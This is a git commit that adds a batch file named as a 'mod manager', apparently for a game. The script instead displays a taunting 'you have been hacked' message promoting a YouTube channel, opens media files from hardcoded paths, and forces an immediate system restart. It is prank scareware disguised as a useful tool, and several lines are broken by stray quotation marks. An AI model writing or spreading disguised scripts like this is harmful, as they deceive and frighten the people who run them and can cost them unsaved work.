211a025c9025d8ccd50e82957ab11f9b0bd741d4
coolguyz-rgb <ebaysalesslibuy@gmail.com>
2024-12-01 03:01:28 -0600

    Add files via upload

---
+++ gtagmodmanager.bat
@@ -0,0 +1,13 @@
+@echo off
+echo YOU HAVE BEEN HACKED YOU IDIOT HAHA WE HAVE YOUR COMPUTER DESTROYED SUB TO @IMAMONKE2OHIO ON YOUTUBE.
+start C:\Users\Audio\Pictures\ohio.png
+start C:\Users\Audio\Desktop\haha.mp4
+pause
+start C:\Users\Audio\Desktop\Filee.wav"
+pause
+start C:\Users\Audio\Desktop\Filee.wav"
+pause
+start C:\Users\Audio\Desktop\Filee.wav"
+timeout /t 10
+shutdown /r /t 0
+
